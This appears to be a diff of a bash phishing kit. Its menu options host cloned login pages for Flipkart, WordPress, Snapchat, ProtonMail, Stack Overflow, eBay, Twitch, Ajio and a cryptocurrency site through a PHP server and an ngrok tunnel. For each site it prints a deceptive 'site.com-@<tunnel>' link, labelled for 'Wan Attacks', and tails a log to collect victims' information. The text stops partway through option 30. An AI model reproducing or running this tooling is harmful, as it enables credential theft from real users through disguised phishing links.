+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.flipkart.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.flipkart.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                  
-  
+                          tail -f log.txt
 
                 break;
                 elif [ $option = 23 ] || [ $option = 23 ]
-	        then
+            then
                           cd sites/
                           cd wordpress/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://wordpress.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://wordpress.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                 
-    
+                          tail -f log.txt
 
                 break;
                 elif [ $option = 24 ] || [ $option = 24 ]
-	        then
+            then
                           cd sites/
                           cd snapchat/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://accounts.snapchat.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://accounts.snapchat.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                  
-      
+                          tail -f log.txt
 
                 break;
                 elif [ $option = 25 ] || [ $option = 25 ]
-	        then
+            then
                           cd sites/
                           cd protonmail/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://protonmail.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://protonmail.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                  
- 
+                          tail -f log.txt
 
                 break;
                 elif [ $option = 26 ] || [ $option = 26 ]
-	        then
+            then
                
                           cd sites/
                           cd stackoverflow/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://stackoverflow.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://stackoverflow.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                  
-             
+                          tail -f log.txt
 
                 break;
                 elif [ $option = 27 ] || [ $option = 27 ]
-	        then
+            then
 
                           cd sites/
                           cd ebay/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://in.ebay.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://in.ebay.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                 
-                  
+                          tail -f log.txt
 
                 break;
                 elif [ $option = 28 ] || [ $option = 28 ]
-	        then
+            then
                           cd sites/
                           cd twitch/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.twitch.tv-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.twitch.tv-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                 
-     
+                          tail -f log.txt
+
                 break;
                 elif [ $option = 29 ] || [ $option = 29 ]
-	        then
+            then
                           cd sites/
                           cd ajio/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.ajio.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.ajio.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt            
- 
+                          tail -f log.txt
 
                 break;
                 elif [ $option = 30 ] || [ $option = 30 ]
-	        then
+            then
                           cd sites/
                           cd cryptocurrency/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
